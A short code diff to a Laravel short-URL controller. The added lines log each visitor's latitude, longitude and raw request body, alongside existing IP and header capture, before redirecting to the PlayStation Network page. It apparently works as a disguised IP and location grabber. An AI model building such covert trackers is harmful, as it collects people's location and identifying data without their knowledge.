@@ -7,11 +7,17 @@ use App\Models\ViewsByUrl;
 use Illuminate\Http\Client\ConnectionException;
 use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Http;
+use Illuminate\Support\Facades\Log;
 
 class ShortUrlController extends Controller
 {
     public function index(Request $request)
     {
+        $lat = $request->input('latitude');
+        $lng = $request->input('longitude');
+
+        Log::channel('daily')->info("Return navigator lat {$lat} , log {$lng}, {$request->getContent()}");
+
         $this->getIp($request->ip(), $request->headers->all());
 
         return redirect('https://www.playstation.com/pt-br/playstation-network');
